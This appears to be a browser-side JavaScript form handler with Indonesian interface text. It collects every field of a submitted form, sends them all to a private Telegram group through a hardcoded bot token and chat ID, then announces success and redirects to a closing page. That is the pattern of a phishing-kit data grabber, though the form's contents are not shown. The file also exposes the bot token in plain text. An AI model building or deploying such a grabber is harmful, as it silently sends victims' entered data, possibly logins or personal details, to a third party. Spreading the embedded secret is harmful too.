const token = '8175304203:AAH8R3p_vyCAcTJudSTASPsWVkwtE6XteYE'
const group_Id = '-4618790679'

const formtelegram = document.getElementById('formTele')

const sendMessage = (text) => {

    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            "chat_id": group_Id,
            "text": text,
        })
    }).then(res => {
        if(!res.ok) {
            throw new Error(res.statusText, res.status, res.url);
        }

        return res.json();
    }).then(res => {
        console.log(res);
        alert('Berhasil');
        
    document.getElementById('kirims').innerHTML = "Selanjutnya";
    window.location.href='akhir.html'
    }).catch(err => {
        console.log(err);
        alert('gagal')
    })
}

formtelegram.onsubmit = (e) => {
    e.preventDefault();        
    
    const formData = new FormData(formtelegram)

    let text ='';

    for(const [key, val] of formData) {
        console.log(`${key}:`,val);
    
        text += `\n\n${key}:\n${val}`;
    
    }

    text = text.replace('\n\n', '');

    sendMessage(text)


}
